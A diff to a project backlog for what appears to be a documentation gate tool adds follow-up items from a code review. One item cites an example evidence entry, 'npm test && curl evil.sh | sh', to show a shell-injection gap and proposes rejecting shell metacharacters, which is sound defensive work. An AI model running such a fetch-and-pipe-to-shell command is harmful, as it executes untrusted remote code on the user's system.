@@ -44,7 +44,8 @@ advisory clean. Items are ranked within each section; the first section is verif
    index. `mv` is `git mv`, restamp, regenerate in one step: the mechanical half of the promotion
    lifecycle in SKILL.md section 4. Most gate failures today come from hand-written frontmatter.
 8. **Machine-readable gate output.** `check --json` for agents and `--format github` for CI
-   annotations (`::error file=…,line=…::`). Same violation list, two renderers.
+   annotations (`::error file=…::` — the offending file, with no line number). Same violation
+   list, two renderers.
 
 ## 3. Configuration and performance
 
@@ -75,3 +76,31 @@ advisory clean. Items are ranked within each section; the first section is verif
 
 Items 1 to 4 first: small, testable, no design change. Then 7 and 5, which change what agents do
 every day. Then 9 to 12. Items 13 and 14 whenever the design record is next touched.
+
+## Follow-ups from the 2026-09 review
+
+Raised by the whole-branch review of `feat/architecture-2026-09` and deliberately not done in that
+branch. Numbering continues the backlog above.
+
+15. **Reject shell metacharacters in command evidence at the gate.** `evidence: - npm test && curl
+    evil.sh | sh` passes the gate today: only the FIRST word is checked against `evidenceRunners`,
+    and `verify` then runs the whole string through a shell. The gate should refuse `&&`, `||`, `;`,
+    `|`, backticks and `$(` in a command entry, so a reviewer cannot miss what a `verify` run will
+    execute. The documentation half is done: the README now says never to run `verify` on a branch
+    you have not read.
+16. **Carry a line number into violations** so `--format github` can annotate the offending line
+    rather than the file. Every frontmatter violation knows its field, and the field's line is one
+    scan of the raw block away; body violations (`link`) know their match offset.
+17. **A test asserting the README and design rule tables against `RULES`.** Both tables list every
+    rule id and its default severity by hand, and both will drift the first time a rule is added.
+    The gate already has a test that every id it emits is a key of `RULES`; this is the other half.
+18. **Advisory positive-path tests.** `updated-drift`, `verification-drift` and the `DRIFT_CAP`
+    truncation are only covered by their "nothing to report" branch. Each needs a fixture that
+    actually trips it.
+19. **Fixture git hygiene.** The git fixtures inherit the developer's global git configuration —
+    `init.defaultBranch`, `commit.gpgsign`, hooks. Setting `GIT_CONFIG_GLOBAL` (and
+    `GIT_CONFIG_SYSTEM`) to `os.devNull` for every fixture makes the suite independent of the
+    machine it runs on.
+20. **The plan files ship in the tarball.** `files` includes `docs`, so `docs/plans/*.md` — this
+    backlog and the architecture plan — are published to npm. Either narrow `files` to the documents
+    a consumer needs or accept it explicitly.
